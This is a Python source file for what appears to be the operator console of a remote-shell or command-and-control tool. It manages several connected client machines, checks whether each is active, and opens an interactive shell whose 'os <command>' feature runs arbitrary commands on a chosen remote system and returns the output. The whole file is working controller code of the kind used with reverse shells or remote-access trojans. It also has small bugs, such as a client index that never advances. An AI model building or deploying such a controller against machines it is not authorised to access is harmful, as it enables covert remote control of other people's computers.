from shell_ui.style import Style
import sys
import socket


class ListenerShell(Style):
    """
    Handles all the user input for the listener shell.
    """

    def __init__(self, listenerSocket):
        self.listenerSocket = listenerSocket

    def run(self):
        while True:
            try:
                command = input('listener > ')
            except KeyboardInterrupt:
                print()
                break
            self.execute(command)

    def execute(self, command):
        if command == '':
            pass

        elif command == 'exit':
            sys.exit(0)

        elif command == 'help':
            self.posSysMsg('Listener Shell Commands:\n')
            print('help   - shows this help menu')
            print('list   - lists all client connections and checks if they are active')
            print('select - start client shell by index')
            print('^C     - exits the listener')

        elif command == 'list':
            index = 0
            for client in self.listenerSocket.getClients():
                try:
                    client.send('ACTIVE', [])
                    data, _ = client.receive(1024)
                except socket.error:
                    self.negSysMsg('Client {} inactive'.format(index))
                if data == 'ACTIVE':
                    self.posSysMsg('Client {} active'.format(index))
                else:
                    self.negSysMsg('Client {} inactive'.format(index))

        elif command[:6] == 'select':
            index = int(command[7])
            client = self.listenerSocket.getClient(index)
            shell = ClientShell(client)
            shell.run()

        else:
            self.negSysMsg('Command unknown')


class ClientShell(Style):
    BUFFERSIZE = 4096

    def __init__(self, client):
        self.client = client

    def run(self):
        self.posSysMsg('Starting shell with client')
        # initalize cwd for shell
        self.client.send('', '')
        _, cwd = self.client.receive(1024)
        while True:
            try:
                command = input('{} > '.format(cwd))
                print()
            except KeyboardInterrupt:
                print()
                continue
            # determine if output needs to be send to not interrupt socket cycle
            executionStatus = self.execute(command)
            # nothing needs to be send
            if executionStatus == -1:
                continue
            # socket needs to be used to receive command output
            elif executionStatus == 0:
                # receive the client output
                output, cwd = self.client.receive(self.BUFFERSIZE)
                print(output)
            # exit client shell
            elif executionStatus == -2:
                break
            else:
                raise ValueError('Output of self.execute should be 0, -1 or -2.')

    def execute(self, command):
        if command == 'help':
            self.posSysMsg('Client Shell Commands:\n')
            print('help         - shows this help menu')
            print('os <command> - executes <command> on the remote system')
            print('^C           - exits the listener')
            return -1
        elif command == '':
            return -1
        elif command[:2] == 'os':
            shellCommand = command[3:]
            self.client.send('EXECUTE', [shellCommand])
        elif command == 'exit':
            self.posSysMsg('Exiting client shell')
            self.client.send('EXIT', [])
            return -2
        else:
            self.negSysMsg('Command not recognized')
            return -1
        return 0